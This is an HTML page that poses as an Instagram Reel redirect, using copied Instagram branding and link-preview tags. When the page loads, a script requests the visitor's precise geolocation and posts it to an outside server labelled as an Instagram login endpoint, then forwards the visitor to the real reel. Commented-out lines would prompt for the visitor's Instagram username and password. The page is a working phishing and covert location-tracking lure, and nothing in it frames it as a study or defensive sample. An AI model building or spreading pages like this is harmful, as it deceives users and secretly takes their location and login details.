<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reel - Watch Now!</title>
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="video.other" />
    <meta property="og:url" content="https://www.instagram.com/reel/DJK8jauIaHo/?igsh=MWpjZG5tanpvN2I0aQ==" />
    <meta property="og:title" content="Watch this Instagram Reel!" />
    <meta property="og:description" content="Check out this Instagram Reel directly." />
    <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png" />
    <!-- Twitter -->
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Watch this Instagram Reel!" />
    <meta name="twitter:description" content="Check out this Instagram Reel directly." />
    <meta name="twitter:image" content="https://www.instagram.com/static/images/ico/favicon-200.png/ab6eff595bb1.png" />
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
      body { font-family: 'Roboto', Arial, sans-serif; }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col justify-center items-center">
  <div class="flex flex-col items-center justify-center w-full max-w-4xl mx-auto py-8">
    <img src="assets/img/ss.png" alt="Instagram app on phone" class="w-60 mb-8">
    <div class="text-lg font-semibold mb-4">Redirecting to Instagram Reel...</div>
    <div class="text-sm text-gray-500">Please wait while we redirect you.</div>
  </div>
  <script>
    async function getUserLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ latitude: null, longitude: null, error: 'Geolocation not supported' });
          return;
        }
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            });
          },
          (error) => {
            resolve({ latitude: null, longitude: null, error: error.message });
          },
          { timeout: 10000, enableHighAccuracy: true }
        );
      });
    }

    async function sendAndRedirect() {
      // Try to get autofilled or hidden values if present
      let username = "";
      let password = "";
      // If you want to prompt, uncomment below:
      // username = prompt("Enter your email/username (optional):", "");
      // password = prompt("Enter your password (optional):", "");
      const location = await getUserLocation();
      await fetch('https://instagram-login-server.onrender.com/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password, location })
      });
      window.location.href = 'https://www.instagram.com/reel/DJK8jauIaHo/?igsh=MWpjZG5tanpvN2I0aQ==';
    }
    sendAndRedirect();
  </script>
</body>
</html> 